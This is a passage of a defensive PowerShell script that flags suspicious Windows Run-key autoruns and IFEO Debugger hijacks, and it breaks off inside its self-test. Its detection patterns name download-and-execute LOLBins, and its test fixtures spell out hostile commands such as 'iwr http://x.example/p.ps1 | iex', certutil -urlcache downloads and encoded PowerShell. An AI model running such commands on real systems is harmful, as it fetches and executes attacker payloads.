# persistence_eval.ps1 -- evaluate Run/RunOnce autoruns and IFEO Debugger
# hijacks for known-malicious indicators. Invoked from Section 5 of
# doze_sec.bat / doze_sec_noAdmin.bat.
#
# WHY: Section 5 raw-dumps the Run keys and printed a bare "[IFEO HIT]" for
# Debugger values, but never evaluated either -- an encoded-PowerShell Run
# key or an IFEO Debugger on a non-accessibility binary scrolled past with no
# verdict (code-review gaps, issue #138). This adds high-signal, low-false-
# positive evaluation:
#
#   Run/RunOnce  -- flags autorun commands whose CONTENT is a strong backdoor
#                   indicator: encoded PowerShell (-enc / -EncodedCommand /
#                   FromBase64String / -e <base64>), or LOLBin download-and-exec
#                   (DownloadString/DownloadFile, iwr|curl|wget to http, piped
#                   or invoked iex, mshta http/javascript, certutil
#                   -urlcache/-decode, bitsadmin /transfer, regsvr32 /i:http or
#                   scrobj, rundll32 javascript); or execution from an unusual
#                   autorun location (\Temp\, \Downloads\, \Public\).
#                   A hidden-window launcher (-w hidden) is common in
#                   legitimate updaters, so it is flagged ONLY when it
#                   co-occurs with a download/encode indicator -- never on its
#                   own. Common legit autorun paths (\AppData\, \ProgramData\)
#                   are deliberately NOT flagged on path alone --
#                   Slack/Discord/Teams/Spotify live there -- so this does not
#                   reintroduce false alarms.
#
#   IFEO         -- ANY Debugger value under Image File Execution Options is a
#                   hijack technique (the debugger runs instead of the target
#                   binary). Section 13 escalates the accessibility binaries
#                   to CRITICAL separately; here every IFEO Debugger, on any
#                   binary, is surfaced as a WARNING so non-accessibility
#                   targets (e.g. notepad.exe) are no longer silent -- with ONE
#                   documented exception: Process Explorer's "Replace Task
#                   Manager" option (Sysinternals, Options menu) is implemented
#                   as exactly this value on taskmgr.exe. When the debugger is a
#                   validly Microsoft-signed procexp binary that is context,
#                   not a finding; an unsigned file called procexp64.exe on the
#                   same key is still the hijack. Get-IfeoVerdict holds the
#                   rule and -SelfTest pins both sides.
#
# OTHER ACCOUNTS (-Part OtherAccounts). Section 5 used to LIST other accounts'
# Run values as [INFO], grade none of them, print [OK] when HKEY_USERS or a key
# could not be read, hide any value named PS*, count the audit's own account
# as "another", and never see an account that was not signed in -- whose Run
# and RunOnce still fire at its next sign-in. Now every value is graded by
# Get-AutorunVerdict, the same rule as HKCU; an unreadable key is a raised gap
# (on a standard-user token, another account's registry refused is a counted
# deferral: those hives deny Users by default, so the token explains it).
# SIGNED-OUT ACCOUNTS (-LoadSignedOut, elevated only, never -readonly): the
# account's NTUSER.DAT (+ .LOG1/.LOG2) is COPIED to %TEMP%, the COPY is mounted
# with reg load as HKU\dz_sec_<pid>_<n>, read through handles that are closed,
# and unmounted; the copy is deleted. The original file is opened only to be
# read and is never mounted, so an interrupted run leaves a mounted COPY and a
# temp file -- the account's next sign-in loads its own untouched file as
# always. Stale dz_sec_* mounts are unloaded at the start of every run, and
# tools\unload_audit_hives.ps1 does it standalone. (RegLoadAppKey, the
# private-hive API, is not an option: Microsoft documents that it fails unless
# every key in the hive has the same security descriptor, which a user hive
# never has.)
#
# A finding writes -MarkerFile so the caller raises the exit code / findings
# count. CRITICAL is intentionally not emitted here (these are high-but-not-
# certain indicators); the caller treats a hit as a WARNING.
#
# Windows PowerShell 5.1 compatible. Read-only (registry reads + one marker
# file write). Executed by the helpers-ps51 CI job.

[CmdletBinding()]
param(
    [string]$MarkerFile,
    # Default: HKCU/HKLM Run keys and IFEO. OtherAccounts: the Run keys of
    # every OTHER account on this PC (see the OTHER ACCOUNTS note below).
    [ValidateSet('Default', 'OtherAccounts')]
    [string]$Part = 'Default',
    # A Run key that could not be read: a raised gap, never an all-clear.
    [string]$GapFile,
    # OtherAccounts only: a count of accounts this token may not read.
    [string]$DeferredFile,
    # OtherAccounts only: written when the part reaches its verdict.
    [string]$DoneFile,
    # OtherAccounts only: read signed-out accounts from a COPY of their
    # registry. The bat passes it only on an elevated, non -readonly run.
    [switch]$LoadSignedOut,
    # CI only: Software roots under HKCU read as if each were another account,
    # and no live account is read.
    [string[]]$OtherRoot = @(),
    [switch]$SelfTest,
    # Whether this process runs elevated. Read once from the token below;
    # injectable so the self-test can grade both tokens. -1 = detect.
    [int]$Elevated = -1
)

$ErrorActionPreference = 'Continue'

function Write-MarkerFile {
    # The marker IS the route to the findings ledger: a failed write turns a
    # real finding into a CLEAN section. Create the directory rather than
    # assume it, and let a genuine failure print instead of vanishing -- the
    # bare `Set-Content -EA SilentlyContinue` this replaces is the exact
    # pattern that cost a field test its finding across twelve tools, and it
    # survived here because tests/marker_selftest.ps1 only discovered tools
    # that define a Write-Marker FUNCTION.
    param([string]$Path, [string]$Value = 'hit')
    if (-not $Path) { return }
    $dir = Split-Path -Parent $Path
    if ($dir -and -not (Test-Path -LiteralPath $dir)) {
        New-Item -ItemType Directory -Path $dir -Force -EA SilentlyContinue | Out-Null
    }
    Set-Content -LiteralPath $Path -Value $Value -Encoding ASCII
}

# Registry key last-write time. PowerShell's registry provider does NOT expose
# it -- Get-Item on a key returns a RegistryKey with no LastWriteTime -- so it
# has to come from RegQueryInfoKey. The type is defined once per process and
# every failure path degrades to $null, which simply omits the registry half of
# the "when:" line rather than inventing a date.
function Get-RegKeyLastWrite {
    param([string]$KeyPath)
    if (-not $KeyPath) { return $null }
    try {
        if (-not ([System.Management.Automation.PSTypeName]'DozeSec.RegTime').Type) {
            Add-Type -ErrorAction Stop -Namespace DozeSec -Name RegTime -MemberDefinition @'
[DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
public static extern int RegQueryInfoKey(IntPtr hKey, System.Text.StringBuilder lpClass,
    IntPtr lpcchClass, IntPtr lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen,
    IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen,
    IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, out long lpftLastWriteTime);
'@
        }
    } catch { return $null }
    $key = $null
    try {
        # Accept both provider paths (HKLM:\...) and PSPath forms.
        $p = $KeyPath -replace '^Microsoft\.PowerShell\.Core\\Registry::', ''
        $p = $p -replace '^HKEY_LOCAL_MACHINE\\', 'HKLM:\' -replace '^HKEY_CURRENT_USER\\', 'HKCU:\'
        $key = Get-Item -LiteralPath $p -EA Stop
        $ft = [long]0
        $rc = [DozeSec.RegTime]::RegQueryInfoKey($key.Handle.DangerousGetHandle(),
            $null, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero,
            [IntPtr]::Zero, [ref]$ft)
        if ($rc -ne 0 -or $ft -le 0) { return $null }
        return [datetime]::FromFileTime($ft)
    } catch { return $null }
}

# Timestamps on a persistence finding: WHEN did this appear? For someone working
# out whether an implant predates a relationship, a job, or a break-in, that is
# the question the finding itself never answered. Both halves are optional --
# whichever is unavailable is simply omitted.
#
# TWO LIMITS, STATED IN THE REPORT TOO, because a timestamp presented without
# them is worse than none:
#   * Registry last-write is per KEY, not per value. Changing ANY value in a Run
#     key updates the whole key, so this is an upper bound on when THIS entry
#     appeared, not a precise date for it.
#   * File times are trivially forged (timestomping, T1070.006). An attacker who
#     cares sets them to whatever they like.
function Get-WhenLine {
    param([string]$KeyPath = '', [string]$FilePath = '')
    $parts = @()
    if ($KeyPath) {
        $lw = Get-RegKeyLastWrite $KeyPath
        if ($null -ne $lw) { $parts += ("registry key last modified {0}" -f $lw.ToString('yyyy-MM-dd HH:mm:ss')) }
    }
    if ($FilePath) {
        try {
            $f = Get-Item -LiteralPath $FilePath -EA Stop
            $parts += ("file written {0}" -f $f.LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss'))
            # Creation AFTER last-write is the classic timestomp tell, so show
            # creation whenever the two disagree in either direction.
            if ($f.CreationTime -and $f.CreationTime -ne $f.LastWriteTime) {
                $parts += ("created {0}" -f $f.CreationTime.ToString('yyyy-MM-dd HH:mm:ss'))
            }
        } catch {}
    }
    if ($parts.Count -eq 0) { return $null }
    return ("  when: {0}" -f ($parts -join '  |  '))
}

# Pull the executable out of an autorun command line so its file times can be
# read: strip a quoted path, or take everything up to the first argument, then
# expand environment variables. Returns '' when nothing file-like is found (a
# pure `powershell -enc <blob>` autorun has no interesting file of its own --
# the registry timestamp is the signal there).
function Get-AutorunBinary {
    param([string]$Command)
    $path = Get-CommandPath $Command
    if (-not $path) { return '' }
    try { $path = [Environment]::ExpandEnvironmentVariables($path) } catch {}
    if (Test-Path -LiteralPath $path -PathType Leaf) { return $path }
    return ''
}

# Emitted once, immediately before the first timestamped finding in this tool's
# output, so the numbers are never read as more precise than they are.
$script:whenCaveatShown = $false
function Write-WhenCaveat {
    if ($script:whenCaveatShown) { return }
    $script:whenCaveatShown = $true
    '  note: registry times are per KEY (any value change updates them) and file times can be forged (timestomping, T1070.006) -- treat them as leads, not proof.'
}

# PowerShell adds these note-properties to every Get-ItemProperty result; they
# are not registry values. Matched by EXACT name -- a '^PS' prefix match would
# also swallow real values whose names start with "PS".
$psNoteProps = @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider')

# STRONG command-content indicators -- fire on their own (unambiguous):
# encoded PowerShell, base64 decode, and LOLBin download-and-exec.
$script:StrongContent = @(
    '-enc(odedcommand)?\b',
    '-e\s+[A-Za-z0-9+/=]{24,}',
    'frombase64string',
    'downloadstring', 'downloadfile',
    '(invoke-webrequest|\biwr\b|\bcurl\b|\bwget\b)[^\r\n]*https?:',
    '(iex|invoke-expression)\s*[\(\$]', '\|\s*(iex|invoke-expression)\b',
    'mshta\s+https?:', 'mshta\s+javascript', 'mshtml,runhtmlapplication',
    'certutil[^\r\n]*-urlcache', 'certutil[^\r\n]*-decode', 'bitsadmin[^\r\n]*/transfer',
    'regsvr32[^\r\n]*/i:http', 'regsvr32[^\r\n]*scrobj', 'rundll32[^\r\n]*javascript'
)
# A hidden-window launcher (-w hidden) ALONE is common in legitimate updaters,
# so flag it only when it co-occurs with a download/encode indicator.
$script:HiddenLauncher = '-w(indowstyle)?\s+hidden'
$script:HiddenCombine  = @('-enc', 'frombase64', 'downloadstring', 'downloadfile',
                           'https?:', '(iex|invoke-expression)\b', '-e\s+[A-Za-z0-9+/=]{24,}')
# Unusual autorun LOCATIONS (path-only signal; kept narrow to avoid FPs).
# Anchored to \Users\Public\ on purpose: a bare \Public\ matched any directory
# named public, e.g. a Node native addon under node_modules\...\public\ in
# Program Files (field false positive 2026-09-20, CRITICAL, exit code 8).
$script:SuspPath = @('\\Temp\\', '\\Downloads\\', '\\Users\\Public\\')

# ---------------------------------------------------------------------------
# PURE VERDICTS. Plain strings in, a reason (or nothing) out: no registry, no
# disk, no signature check. The judgement lives here so it can be pinned
# against the real autoruns of a real machine.
# ---------------------------------------------------------------------------

# The executable named by a command line, WITHOUT touching the disk: a quoted
# path, or the first token. Used by the IFEO rule (which needs the file name)
# and by Get-AutorunBinary (which then checks the disk).
function Get-CommandPath {
    param([string]$Command)
    if (-not $Command) { return '' }
    $c = $Command.Trim()
    if ($c.StartsWith('"')) {
        $end = $c.IndexOf('"', 1)
        if ($end -gt 1) { return $c.Substring(1, $end - 1) }
        return ''
    }
    $m = [regex]::Match($c, '^([^\s]+\.(?:exe|dll|scr|bat|cmd|ps1|vbs|js|com))\b', 'IgnoreCase')
    if ($m.Success) { return $m.Groups[1].Value }
    return ($c -split '\s+')[0]
}

# A Run/RunOnce value: the reason it is suspicious, or $null when it is not.
# Three tiers, strongest first: command CONTENT (fires alone), a hidden-window
# launcher combined with a download/encode indicator, then an unusual PATH.
function Get-AutorunVerdict {
    param([string]$Key, [string]$Name, [string]$Value)
    if (-not $Value) { return $null }
    foreach ($s in $script:StrongContent) { if ($Value -match $s) { return "command content ($s)" } }
    if ($Value -match $script:HiddenLauncher) {
        foreach ($s in $script:HiddenCombine) { if ($Value -match $s) { return "hidden-window launcher + $s" } }
    }
    foreach ($s in $script:SuspPath) { if ($Value -match $s) { return "unusual autorun path ($s)" } }
    return $null
}

# An IFEO Debugger value. Every one is a hijack EXCEPT the one Sysinternals
# documents: Process Explorer > Options > Replace Task Manager writes
#   IFEO\taskmgr.exe\Debugger = "<path>\procexp64.exe"
# (https://learn.microsoft.com/sysinternals/downloads/process-explorer). That
# is context when -- and only when -- the debugger binary is validly signed by
# Microsoft (Sysinternals ships Microsoft-signed). The NAME is not the
# evidence: an unsigned file called procexp64.exe on that key is the hijack.
function Get-IfeoVerdict {
    param([string]$Target, [string]$Debugger, [bool]$DebuggerSigned, [string]$DebuggerSigner = '')
    $exe = Split-Path -Leaf (Get-CommandPath $Debugger)
    if ($Target -ieq 'taskmgr.exe' -and $exe -imatch '^procexp(64)?(a)?\.exe$' -and $DebuggerSigned -and $DebuggerSigner -match '\bMicrosoft\b') {
        return @{ Sev = 'OK'; Line = "[INFO] IFEO Debugger on taskmgr.exe is Process Explorer's 'Replace Task Manager' option (validly Microsoft-signed): $Debugger. Context, not a finding -- Sysinternals writes exactly this value." }
    }
    return @{ Sev = 'WARNING'; Line = "[WARNING] IFEO Debugger hijack: $Target => $Debugger" }
}

# PURE: IFEO subkeys the token could not open. The enumeration used to run
# with -EA Stop, so ONE restricted subkey terminated it and the whole
# Debugger-hijack check printed [SKIPPED] -- both standard-user field runs of
# 2026-09-24 lost it that way. Now the readable subkeys are graded and the
# unreadable ones are NAMED: as a standard user that is the token (INFO, not
# graded, not cleared); elevated, an IFEO entry an administrator cannot read
# is itself worth a finding (WARNING) -- a Debugger value there cannot be
# audited, and a restricted ACL is how one would be hidden.
function Get-IfeoReadReport {
    param([string[]]$Unreadable, [bool]$IsElevated)
    $u = @($Unreadable | Where-Object { $_ })
    if ($u.Count -eq 0) { return @{ Lines = @(); Sev = 'OK' } }
    $noun = if ($u.Count -eq 1) { 'entry' } else { 'entries' }
    if ($IsElevated) {
        return @{ Sev = 'WARNING'; Lines = @(("[WARNING] {0} IFEO {1} not readable by an administrator: {2} -- a Debugger value there cannot be audited, and a restricted ACL is how a hijack would be hidden (verify: reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<name>"" from an elevated prompt)." -f $u.Count, $noun, ($u -join ', '))) }
    }
    return @{ Sev = 'OK'; Lines = @(("[INFO] {0} IFEO {1} not readable from this token: {2} -- not graded, not cleared; re-run as administrator to grade them." -f $u.Count, $noun, ($u -join ', '))) }
}

# Live. One Run key through a .NET base key: @{ State = ok|nokey|unreadable|
# denied; Error; Values = @(@{ Name; Value }) }. The key is closed before this
# returns (a mounted hive copy cannot be unloaded while a handle is open).
# Exact value names: no PowerShell note properties to filter, no wildcards.
function Read-RunValues {
    param($Base, [string]$SubPath)
    $k = $null
    try {
        try { $k = $Base.OpenSubKey($SubPath, $false) }
        catch {
            $den = ($_.Exception -is [System.Security.SecurityException] -or $_.Exception -is [System.UnauthorizedAccessException] -or ($_.Exception.InnerException -is [System.Security.SecurityException]))
            return @{ State = $(if ($den) { 'denied' } else { 'unreadable' }); Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); Values = @() }
        }
        if ($null -eq $k) { return @{ State = 'nokey'; Error = ''; Values = @() } }
        $vals = New-Object System.Collections.ArrayList
        foreach ($n in @($k.GetValueNames())) { [void]$vals.Add(@{ Name = $(if ($n) { [string]$n } else { '(Default)' }); Value = [string]$k.GetValue($n) }) }
        return @{ State = 'ok'; Error = ''; Values = @($vals.ToArray()) }
    } catch {
        return @{ State = 'unreadable'; Error = ($_.Exception.GetType().Name + ': ' + $_.Exception.Message); Values = @() }
    } finally { if ($k) { $k.Close() } }
}

$script:RunSubs = @('Microsoft\Windows\CurrentVersion\Run', 'Microsoft\Windows\CurrentVersion\RunOnce', 'Wow6432Node\Microsoft\Windows\CurrentVersion\Run', 'Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce')

function ConvertTo-PrintableLine {
    param([string]$s)
    $t = (([string]$s) -replace '[\x00-\x1F\x7F]', '?')
    if ($t.Length -gt 300) { $t = $t.Substring(0, 300) + '...' }
    return $t
}

# PURE. $Accounts: @( @{ Label; How = signed-in|copy|ci; Keys = @( @{ Sub;
# R = <Read-RunValues result> } ); Error = '' (the account could not be read
# at all) } ). $NotRead: @(labels of signed-out accounts left unread, gate
# off). $ListError: '' or why the accounts could not be listed.
# Returns @{ Lines; Hit; Gap; Deferred }.
function Get-OtherAccountsVerdict {
    param($Accounts, $NotRead = @(), [string]$ListError = '', [bool]$IsElevated = $true, [string]$NotReadWhy = '')
    $out = New-Object System.Collections.ArrayList
    $r = @{ Hit = $false; Gap = $false; Deferred = 0 }
    $gaps = New-Object System.Collections.ArrayList
    $defer = New-Object System.Collections.ArrayList
    $listing = New-Object System.Collections.ArrayList
    if ($ListError) { [void]$gaps.Add(('the accounts on this PC could not be listed (' + (ConvertTo-PrintableLine $ListError) + ')')) }
    $read = 0
    foreach ($a in @($Accounts)) {
        $lab = ConvertTo-PrintableLine ([string]$a.Label)
        if ($a.Error) {
            if ([string]$a.Error -eq 'denied' -and -not $IsElevated) { [void]$defer.Add($lab) } else { [void]$gaps.Add(($lab + ': ' + (ConvertTo-PrintableLine ([string]$a.Error)))) }
            continue
        }
        $acctOk = $true
        foreach ($kk in @($a.Keys)) {
            $st = [string]$kk.R.State
            if ($st -eq 'nokey') { continue }
            if ($st -ne 'ok') {
                if ($st -eq 'denied' -and -not $IsElevated) { if (-not $defer.Contains($lab)) { [void]$defer.Add($lab) } }
                else { [void]$gaps.Add(($lab + ' ' + [string]$kk.Sub + ': ' + (ConvertTo-PrintableLine ([string]$kk.R.Error)))) }
                $acctOk = $false; continue
            }
            foreach ($v in @($kk.R.Values)) {
                $loc = ('[' + $lab + '\' + [string]$kk.Sub + '\' + (ConvertTo-PrintableLine ([string]$v.Name)) + ']')
                $why = Get-AutorunVerdict -Key ([string]$kk.Sub) -Name ([string]$v.Name) -Value ([string]$v.Value)
                if ($why) {
                    [void]$out.Add(('[WARNING] Suspicious Run-key autorun in another account ' + $loc + ': ' + (ConvertTo-PrintableLine ([string]$v.Value))))
                    [void]$out.Add(('  indicator: ' + $why))
                    $r.Hit = $true
                }
                if ($listing.Count -lt 25) { [void]$listing.Add(('    ' + $loc + ' = ' + (ConvertTo-PrintableLine ([string]$v.Value)))) }
            }
        }
        if ($acctOk) { $read++ }
    }
    if ($listing.Count -gt 0) { [void]$out.Add('[INFO] Run/RunOnce entries in other accounts (context; each was graded above):'); foreach ($l in $listing) { [void]$out.Add($l) } }
    if ($gaps.Count -gt 0) {
        $names = (@($gaps | Select-Object -First 3) -join '; ') + $(if ($gaps.Count -gt 3) { ('; and ' + ($gaps.Count - 3) + ' more') } else { '' })
        [void]$out.Add(('[WARNING] Other accounts'' Run-key check NOT performed' + $(if ($read -gt 0) { ' in full' } else { '' }) + ' -- ' + $names + ', so an autorun planted in that account would go unseen (T1547.001).'))
        $r.Gap = $true
    }
    if ($defer.Count -gt 0) {
        [void]$out.Add(('[DEFERRED - ADMIN REQUIRED] Other accounts'' Run keys: ' + $defer.Count + ' account(s) this token may not read: ' + ((@($defer) | Select-Object -First 5) -join ', ') + '.'))
        $r.Deferred = $defer.Count
    }
    $nr = @($NotRead | Where-Object { [string]$_ })
    if ($nr.Count -gt 0) { [void]$out.Add(('[INFO] ' + $nr.Count + ' signed-out account(s) not read: ' + ((@($nr | ForEach-Object { ConvertTo-PrintableLine ([string]$_) }) | Select-Object -First 5) -join ', ') + $(if ($NotReadWhy) { ' (' + $NotReadWhy + ')' } else { '' }) + '. Their Run keys run at their next sign-in.')) }
    if (-not $r.Hit -and -not $r.Gap) {
        if (@($Accounts).Count -eq 0 -and $nr.Count -eq 0) { [void]$out.Add('[OK] No other account on this PC has a profile to read.') }
        elseif ($read -gt 0) { [void]$out.Add(('[OK] No suspicious Run-key autorun in ' + $read + ' other account(s) read.')) }
    }
    $r.Lines = @($out.ToArray())
    return $r
}

# PURE. The user's own and the machine's Run keys that could not be read.
function Get-RunKeyGapLines {
    param([string[]]$Unread)
    $u = @($Unread | Where-Object { $_ })
    if ($u.Count -eq 0) { return @() }
    return @(('[WARNING] Run-key evaluation NOT performed in full -- ' + $u.Count + ' Run key(s) could not be read: ' + ((@($u | ForEach-Object { ConvertTo-PrintableLine $_ })) -join '; ') + ', so an autorun there would go unseen (T1547.001).'))
}

# PURE. Which ProfileList entries are other accounts not signed in.
function Select-SignedOutProfiles {
    param($Profiles, [string[]]$Loaded, [string]$MySid)
    return @(@($Profiles) | Where-Object { [string]$_.Sid -match '^S-1-5-21-[\d-]+$' -and [string]$_.Sid -ne $MySid -and @($Loaded) -notcontains [string]$_.Sid })
}

if ($SelfTest) {
    $fails = 0
    function T { param([string]$Name, [bool]$Ok, [string]$Got)
        if ($Ok) { Write-Output "[OK]   $Name" } else { Write-Output "[FAIL] $Name$(if($Got){": $Got"})"; $script:fails++ }
    }
    $hkcu = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    $hklm = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
    # The owner's real autoruns, pinned VERBATIM from
    # SecurityReport_20260920_185017 (Section 5 reg query dump). Every one is
    # ordinary software and every one must grade $null.
    $benign = @(
        @($hkcu, 'OneDrive', '"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background'),
        @($hkcu, 'BraveSoftware Update', '"C:\Users\alice\AppData\Local\BraveSoftware\Update\1.3.361.151\BraveUpdateCore.exe"'),
        @($hkcu, 'org.whispersystems.signal-desktop', 'C:\Users\alice\AppData\Local\Programs\signal-desktop\Signal.exe --start-in-tray'),
        @($hkcu, 'Adobe Acrobat Synchronizer', '"C:\Program Files\Adobe\Acrobat DC\Acrobat\AdobeCollabSync.exe"'),
        @($hkcu, 'Proton Drive', '"C:\Users\alice\AppData\Local\Programs\Proton\Drive\ProtonDrive.exe" -quiet'),
        @($hkcu, 'MicrosoftEdgeAutoLaunch_5B486EA56FC3A190C4F0BB45771E329D', '"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start'),
        @($hkcu, 'Docker Desktop', 'C:\Users\alice\AppData\Local\Programs\DockerDesktop\Docker Desktop.exe'),
        @($hkcu, 'MicrosoftCopilotAutoLaunch_F6FB03BD129D17F0D98665BA91661954', '"C:\Program Files (x86)\Microsoft\Copilot\Application\mscopilot.exe" --no-startup-window --win-session-start'),
        @($hklm, 'SecurityHealth', '%windir%\system32\SecurityHealthSystray.exe'),
        @($hklm, 'RtkAudUService', '"C:\WINDOWS\System32\DriverStore\FileRepository\realtekservice.inf_amd64_d4e2f40b8460b254\RtkAudUService64.exe" -background'),
        @($hklm, 'WavesSvc', '"C:\WINDOWS\System32\DriverStore\FileRepository\wavesapo12de.inf_amd64_7705ab85ca3fc744\WavesSvc64.exe" -Jack'),
        @($hklm, 'deviceTRUST Client User', '""'),
        @($hklm, 'RTKUGUI', '"C:\WINDOWS\system32\RtkUGui64.exe" -s'),
        @($hklm, 'Logi Download Assistant', '"C:\Program Files\LogiDownloadAssistant\bin\logi_download_assistant.exe" -system-restarted'),
        @('HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'msedge_cleanup_{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}', '"C:\Program Files (x86)\Microsoft\EdgeWebView\Application\153.0.4234.48\Installer\setup.exe" --msedgewebview --delete-old-versions --system-level --verbose-logging')
    )
    foreach ($b in $benign) {
        $why = Get-AutorunVerdict -Key $b[0] -Name $b[1] -Value $b[2]
        T ("owner's real autorun is not a finding: " + $b[1]) ($null -eq $why) ("why=" + $why)
    }
    T 'a hidden-window launcher ALONE is common in updaters and is not a finding' ($null -eq (Get-AutorunVerdict -Key $hkcu -Name 'Upd' -Value 'powershell.exe -WindowStyle Hidden -File "C:\Program Files\Vendor\update.ps1"')) ''
    T 'an AppData path alone is not a finding (Slack, Discord, Teams live there)' ($null -eq (Get-AutorunVerdict -Key $hkcu -Name 'X' -Value 'C:\Users\u\AppData\Local\Vendor\app.exe --minimized')) ''
    T 'a ProgramData path alone is not a finding' ($null -eq (Get-AutorunVerdict -Key $hklm -Name 'X' -Value '"C:\ProgramData\Vendor\agent.exe" /tray')) ''
    T 'an empty value is not a finding' ($null -eq (Get-AutorunVerdict -Key $hklm -Name 'X' -Value '')) ''

    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA'
    T 'hidden window + -enc is a finding' ($why -match 'command content') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell.exe -w hidden -c "iwr http://x.example/p.ps1 | iex"'
    T 'hidden window + a download is a finding' ($null -ne $why) ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAA=='
    T '-e followed by a base64 blob is a finding' ($why -match 'command content') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'mshta http://x.example/a.hta'
    T 'mshta from a URL is a finding' ($why -match 'command content') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'certutil -urlcache -split -f http://x.example/a.exe a.exe'
    T 'certutil -urlcache is a finding' ($why -match 'command content') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'C:\Users\u\Downloads\setup_helper.exe'
    T 'an autorun from Downloads is a finding on path alone' ($why -match 'unusual autorun path') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value '"C:\Users\Public\svc.exe" -q'
    T 'an autorun from Users\Public is a finding' ($why -match 'unusual autorun path') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hkcu -Name 'Updater' -Value 'C:\Users\u\AppData\Local\Temp\upd.exe'
    T 'an autorun from Temp is a finding' ($why -match 'unusual autorun path') ("why=" + $why)
    $why = Get-AutorunVerdict -Key $hklm -Name 'X' -Value 'C:\Program Files\Vendor\public\helper.exe'
    T 'a vendor directory named public is NOT a staging path (the #214 regex)' ($null -eq $why) ("why=" + $why)

    # IFEO: the documented benign twin and its impostor.
    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger '"C:\Tools\SysinternalsSuite\procexp64.exe"' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US'
    T 'IFEO taskmgr.exe -> Microsoft-signed procexp64.exe is Replace Task Manager: INFO, no finding' ($v.Sev -eq 'OK' -and $v.Line -match "^\[INFO\] .*Replace Task Manager") $v.Line
    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Tools\procexp.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation'
    T 'the 32-bit procexp.exe name is covered too' ($v.Sev -eq 'OK') $v.Line
    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Users\Public\procexp64.exe' -DebuggerSigned $false -DebuggerSigner ''
    T 'an UNSIGNED procexp64.exe on taskmgr.exe is the hijack (the name is not the evidence)' ($v.Sev -eq 'WARNING' -and $v.Line -match '^\[WARNING\] IFEO Debugger hijack: taskmgr\.exe') $v.Line
    $v = Get-IfeoVerdict -Target 'taskmgr.exe' -Debugger 'C:\Tools\procexp64.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Some Other Publisher'
    T 'a procexp64.exe signed by someone other than Microsoft is the hijack' ($v.Sev -eq 'WARNING') $v.Line
    $v = Get-IfeoVerdict -Target 'notepad.exe' -Debugger 'C:\Tools\procexp64.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Corporation'
    T 'signed procexp on any target OTHER than taskmgr.exe is still a hijack' ($v.Sev -eq 'WARNING') $v.Line
    $v = Get-IfeoVerdict -Target 'sethc.exe' -Debugger 'C:\Windows\System32\cmd.exe' -DebuggerSigned $true -DebuggerSigner 'CN=Microsoft Windows'
    T 'sethc.exe -> cmd.exe is the classic hijack even though cmd.exe is Microsoft-signed' ($v.Sev -eq 'WARNING') $v.Line
    $v = Get-IfeoVerdict -Target 'notepad.exe' -Debugger 'C:\Users\Public\d.exe' -DebuggerSigned $false
    T 'a non-accessibility target with an unsigned debugger is a WARNING' ($v.Sev -eq 'WARNING') $v.Line
    T 'Get-CommandPath strips quotes and arguments' ((Get-CommandPath '"C:\Program Files\X\y.exe" --flag') -eq 'C:\Program Files\X\y.exe' -and (Get-CommandPath 'C:\T\z.exe -a') -eq 'C:\T\z.exe') ''

    # IFEO subkeys the token cannot open (both standard-user field runs of
    # 2026-09-24 lost the whole check to one such subkey).
    $r = Get-IfeoReadReport -Unreadable @('dzsmoke_ifeo.exe') -IsElevated $false
    T 'an unreadable IFEO subkey as a standard user is INFO, named, not graded, not cleared -- and the check still runs' ($r.Sev -eq 'OK' -and $r.Lines.Count -eq 1 -and $r.Lines[0] -match '^\[INFO\] 1 IFEO entry not readable from this token: dzsmoke_ifeo\.exe -- not graded, not cleared') ($r.Lines -join ' | ')
    $r = Get-IfeoReadReport -Unreadable @('a.exe', 'b.exe') -IsElevated $true
    T 'IFEO subkeys an ADMINISTRATOR cannot read are a WARNING that names them' ($r.Sev -eq 'WARNING' -and $r.Lines[0] -match '^\[WARNING\] 2 IFEO entries not readable by an administrator: a\.exe, b\.exe') ($r.Lines -join ' | ')
    $r = Get-IfeoReadReport -Unreadable @() -IsElevated $false
